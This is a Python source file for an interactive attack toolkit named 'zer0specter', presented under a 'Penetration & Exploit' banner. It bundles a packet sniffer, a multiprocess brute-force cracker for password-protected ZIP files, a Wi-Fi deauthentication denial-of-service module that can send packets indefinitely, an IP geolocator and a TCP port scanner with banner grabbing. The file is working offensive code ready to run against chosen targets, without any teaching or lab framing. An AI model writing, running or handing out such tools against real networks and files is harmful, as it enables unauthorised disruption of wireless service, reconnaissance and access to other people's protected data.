import random
import string
import socket
import pyzipper
from itertools import product
from multiprocessing import Pool, cpu_count
import sys
import requests
import time
import os
import readline
import prompt_toolkit
import argparse
from scapy.all import *
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, ARP, IP, TCP, UDP, ICMP, Ether

# ASCII banner
ascii_zero = r"""
 ________                   __                     
/\_____  \                /'__`\                   
\/____//'/'     __  _ __ /\ \/\ \                  
     //'/'    /'__`/\`'__\ \ \ \ \                 
    //'/'___ /\  __\ \ \/ \ \ \_\ \                
    /\_______\ \____\ \_\  \ \____/                
 ____/_______/\/____/\/_/   \/___/                 
/\  _`\                       /\ \__               
\ \,\L\_\  _____     __    ___\ \ ,_\    __  _ __  
 \/_\__ \ /\ '__`\ /'__`\ /'___\ \ \/  /'__`/\`'__\
   /\ \L\ \ \ \L\ /\  __//\ \__/\ \ \_/\  __\ \ \/ 
   \ `\____\ \ ,__\ \____\ \____\\ \__\ \____\ \_\ 
    \/_____/\ \ \/ \/____/\/____/ \/__/\/____/\/_/ 
             \ \_\                                 
              \/_/                                                                 
+----------------------------------+
|           PENETRATION &          |
|             EXPLOIT              |
+----------------------------------+              
"""
def slow_print(text, delay=0.002):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
def loading_bar(duration=2, length=30):
    sys.stdout.write("[")
    sys.stdout.flush()
    for i in range(length):
        time.sleep(duration / length)
        sys.stdout.write("█")
        sys.stdout.flush()
    sys.stdout.write("]\n")
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    slow_print(ascii_zero, 0.0008)
    print("\n")
    slow_print("Loading zer0specter framework...\n", 0.02)
    loading_bar()
    time.sleep(0.3)
    slow_print("Initializing modules...\n", 0.02)
    loading_bar()
    time.sleep(0.3)
    slow_print("Ready.\n", 0.02)

# Helper for ZIP cracking
def worker_try_password(args_tuple):
    password, zip_path = args_tuple
    try:
        with pyzipper.AESZipFile(zip_path, 'r') as zf:
            zf.extractall(pwd=password.encode())
        return (password, True)
    except:
        return (password, False)

# --- FEATURES ---
def sniffer(argus):
    def args():
        parser = argparse.ArgumentParser(description="Packet sniffer (like tcpdump)")
        parser.add_argument("-i", "--interface", dest="interface", help="Network interface to sniff on", default=None)
        parser.add_argument("-si", "--showinterfaces", dest="sinterfaces", action="store_true", help="List available network interfaces")
        return parser.parse_args(argus)

    args_parsed = args()

    if args_parsed.sinterfaces:
        print("\n[+] Available network interfaces:")
        for idx, iface in enumerate(ifaces):
            print(f"  {idx}: {iface}")
        return

    if not args_parsed.interface:
        print("[!] Error: Please specify an interface with -i/--interface.")
        print("    Use --showinterfaces to list available interfaces.")
        return

    print(f"\n[+] Starting sniffer on interface: {args_parsed.interface}")
    print("[+] Press Ctrl+C to stop.\n")
    print(f"{'TIME':<10} {'PROTOCOL':<8} {'SOURCE':<22} {'DESTINATION':<22} {'INFO'}")
    print("-" * 80)

    def process_packet(packet):
        try:
            ts = time.strftime("%H:%M:%S", time.localtime())
            proto = "OTHER"
            src = dst = "N/A"
            info = ""

            if packet.haslayer(IP):
                src = packet[IP].src
                dst = packet[IP].dst
                proto_num = packet[IP].proto
                if proto_num == 6:
                    proto = "TCP"
                elif proto_num == 17:
                    proto = "UDP"
                elif proto_num == 1:
                    proto = "ICMP"
                else:
                    proto = f"IP({proto_num})"

                if packet.haslayer(TCP):
                    sport = packet[TCP].sport
                    dport = packet[TCP].dport
                    info = f"{sport} → {dport}"
                elif packet.haslayer(UDP):
                    sport = packet[UDP].sport
                    dport = packet[UDP].dport
                    info = f"{sport} → {dport}"
                elif packet.haslayer(ICMP):
                    info = f"Type {packet[ICMP].type} Code {packet[ICMP].code}"

            elif packet.haslayer(ARP):
                proto = "ARP"
                src = packet[ARP].psrc
                dst = packet[ARP].pdst
                info = "who-has" if packet[ARP].op == 1 else "is-at"

            elif packet.haslayer(Dot11):
                proto = "WLAN"
                src = packet[Dot11].addr2 or "N/A"
                dst = packet[Dot11].addr1 or "N/A"
                info = ""

            else:
                if packet.haslayer(Ether):
                    src = packet[Ether].src
                    dst = packet[Ether].dst
                info = f"{len(packet)} bytes"

            src = (src[:20] + "..") if len(src) > 20 else src
            dst = (dst[:20] + "..") if len(dst) > 20 else dst
            info = (info[:30] + "..") if len(info) > 30 else info

            print(f"{ts:<10} {proto:<8} {src:<22} {dst:<22} {info}")

        except Exception:
            pass  # Skip malformed packets silently

    try:
        sniff(iface=args_parsed.interface, prn=process_packet, store=False)
    except PermissionError:
        print("\n[!] Permission denied. Please run as root/Administrator.")
    except KeyboardInterrupt:
        print("\n\n[+] Sniffer stopped by user.")
def zipcrack(argus):
    parser = argparse.ArgumentParser(description="Crack password-protected ZIP files")
    parser.add_argument("-l", "--letters", dest="use_letters", help="Include letters (y/n)", default='n')
    parser.add_argument("-n", "--numbers", dest="use_numbers", help="Include digits (y/n)", default='n')
    parser.add_argument("-sc", "--specialcharacters", dest="use_special", help="Include special characters (y/n)", default='n')
    parser.add_argument("-s", "--size", dest="length", type=int, required=True, help="Password length to test")
    parser.add_argument("-p", "--path", dest="zip_path", required=True, help="Path to the target ZIP file")
    args = parser.parse_args(argus)

    charset = ""
    if args.use_letters == 'y':
        charset += string.ascii_letters
    if args.use_numbers == 'y':
        charset += string.digits
    if args.use_special == 'y':
        charset += string.punctuation

    if not charset:
        print("[ERROR] No character set selected. Exiting...")
        return

    def generate_combinations():
        for combo in product(charset, repeat=args.length):
            yield (''.join(combo), args.zip_path)

    print(f"[INFO] Starting brute-force with charset: '{charset}' and length: {args.length}")
    with Pool(cpu_count()) as pool:
        total = 0
        for password, success in pool.imap_unordered(worker_try_password, generate_combinations(), chunksize=500):
            total += 1
            print(f"[{total}] Testing: {password}")
            if success:
                print(f"\n✅ Password found: {password}")
                pool.terminate()
                return password
    print("[INFO] Password not found.")
def pass_gen(argus):
    parser = argparse.ArgumentParser(description="Generate a random secure password")
    parser.add_argument("-nc", "--numberchar", dest="length", type=int, required=True, help="Password length")
    parser.add_argument("-p", "--punctuation", dest="use_punct", help="Include special characters? (y/n)", default='n')
    parser.add_argument("-n", "--numbers", dest="use_nums", help="Include numbers? (y/n)", default='n')
    parser.add_argument("-up", "--uppercase", dest="use_upper", help="Include uppercase letters? (y/n)", default='n')
    args = parser.parse_args(argus)

    charset = string.ascii_lowercase
    if args.use_punct == 'y':
        charset += string.punctuation
    if args.use_nums == 'y':
        charset += string.digits
    if args.use_upper == 'y':
        charset += string.ascii_uppercase

    password = ''.join(random.choice(charset) for _ in range(args.length))
    print(password)
def wifi_blackout(argus):
    parser = argparse.ArgumentParser(description="Wi-Fi deauthentication (DoS) attack")
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Wireless interface (in monitor mode)")
    parser.add_argument("-a", "--ap", dest="ap_mac", required=True, help="Target AP MAC address")
    parser.add_argument("-c", "--client", dest="client_mac", required=True, help="Target client MAC address")
    parser.add_argument("-n", "--count", dest="count", type=int, default=10, help="Number of deauth packets (0 = infinite)")
    parser.add_argument("--interval", dest="interval", type=float, default=0.1, help="Interval between packets (seconds)")
    args = parser.parse_args(argus)

    def build_deauth_packet(ap_mac, client_mac):
        from scapy.all import RadioTap, Dot11, Dot11Deauth
        return (
            RadioTap() /
            Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
            Dot11Deauth(reason=7)
        )

    packet = build_deauth_packet(args.ap_mac, args.client_mac)

    if args.count == 0:
        print("[INFO] Sending deauthentication packets indefinitely... (Press Ctrl+C to stop)")
        sendp(packet, iface=args.interface, inter=args.interval, loop=1, verbose=True)
    else:
        print(f"[INFO] Sending {args.count} deauthentication packets...")
        sendp(packet, iface=args.interface, count=args.count, inter=args.interval, verbose=True)
def ip_locater(argus):
    parser = argparse.ArgumentParser(description="Geolocate an IP address")
    parser.add_argument("-ip", type=str, nargs='?', default=None, help="Target IP address (leave empty for your own IP)")
    args = parser.parse_args(argus)

    target_ip = args.ip if args.ip else ""
    try:
        url = f"https://ipwho.is/{target_ip}" if target_ip else "https://ipwho.is/"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            if data.get("success", True):
                print("----- Result -----")
                print(f"IP: {data.get('ip')}")
                print(f"Country: {data.get('country')}")
                print(f"Region: {data.get('region')}")
                print(f"City: {data.get('city')}")
                print(f"ISP: {data.get('isp')}")
                print(f"Connection Type: {data.get('type')}")
                print(f"Latitude: {data.get('latitude')}")
                print(f"Longitude: {data.get('longitude')}")
            else:
                print(f"[ERROR] API error: {data.get('message', 'Unknown')}")
        else:
            print(f"[ERROR] Request failed. Status code: {response.status_code}")
    except Exception as e:
        print(f"[ERROR] Exception occurred: {str(e)}")
def portscanner(argus):
    def arguments():
        p = argparse.ArgumentParser(description="port scanner / banner grabber")
        p.add_argument("-t", "--target", help="IPv4 or hostname of target", dest="target", required=True)
        p.add_argument("-s", "--start", help="start port", dest="start", type=int, default=1)
        p.add_argument("-e", "--end", help="end port", dest="end", type=int, default=2048)
        p.add_argument("-d", "--delay", help="socket timeout in seconds", dest="timeout", type=float, default=0.2)
        return p.parse_args(argus)

    def scan(host, port, timeout):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))
            try:
                data = s.recv(1024)
                if data:
                    return data.decode('utf-8', errors="replace").strip()
                try:
                    s.sendall(b"HEAD / HTTP/1.0\r\nHost: %s\r\n\r\n" % host.encode())
                    data = s.recv(2048)
                    if data:
                        text = data.decode('utf-8', errors="replace").splitlines()
                        for line in text:
                            if line.lower().startswith("server:"):
                                return line.strip()
                        return text[0].strip() if text else None
                except Exception:
                    pass
            finally:
                s.close()
        except Exception:
            return None

    def scanner(host, start, end, timeout):
        if start < 1 or end > 65535 or start > end:
            print("[!] Invalid port interval")
            return

        open_ports = []
        print(f"[*] Scanning {host} ports {start}..{end} (timeout={timeout}s)")
        for port in range(start, end + 1):
            banner = scan(host, port, timeout)
            if banner is not None:
                print(f"[+] OPEN {port:5d}  - banner: {banner}")
                open_ports.append((port, banner))

        if not open_ports:
            print("[*] NO OPEN PORTS FOUND")
        else:
            print("\n[*] Summary:")
            for port, banner in sorted(open_ports):
                print(f" - {port:5d} : {banner}")

    def main():
        args = arguments()
        try:
            host_ip = socket.gethostbyname(args.target)
        except Exception as e:
            print(f"[!] Erro ao resolver host '{args.target}': {e}")
            sys.exit(1)

        scanner(host_ip, args.start, args.end, args.timeout)
    
    main()

# --- COMMAND REGISTRY ---
FEATURES = {
    "zipcrack": (zipcrack, "Crack password-protected ZIP files"),
    "passgen": (pass_gen, "Generate random secure passwords"),
    "wifiblackout": (wifi_blackout, "Perform Wi-Fi deauthentication (DoS) attacks"),
    "iplocator": (ip_locater, "Geolocate an IP address"),
    "sniffer": (sniffer, "Capture and display network packets"),
    "portscanner": (portscanner, "Check open ports by bruteforce")
}
def show_help():
    print("\nAvailable commands:")
    for cmd, (_, desc) in FEATURES.items():
        print(f"  {cmd:<15} {desc}")
    print("  help            Show this help message")
    print("  quit / exit     Exit the program\n")
def main():
    while True:
        try:
            user_input = input("[Zer0Specter] > ").strip()
            if not user_input:
                continue
            parts = user_input.split()
            command = parts[0].lower()
            args = parts[1:]

            if command in FEATURES:
                try:
                    FEATURES[command][0](args)
                except SystemExit:
                    pass  # argparse already printed help/error
                except Exception as e:
                    print(f"[ERROR] An unexpected error occurred: {e}")
            elif command in ["quit", "exit"]:
                print("Exiting...")
                time.sleep(1)
                break
            elif command == "clear":
                os.system("clear" if os.name != "nt" else "cls")
            elif command == "help":
                show_help()
            else:
                print(f"[ERROR] Unknown command: '{command}'. Type 'help' for available commands.")
        except KeyboardInterrupt:
            print("\n\nExiting...")
            break
if __name__ == "__main__":
    banner()
    main()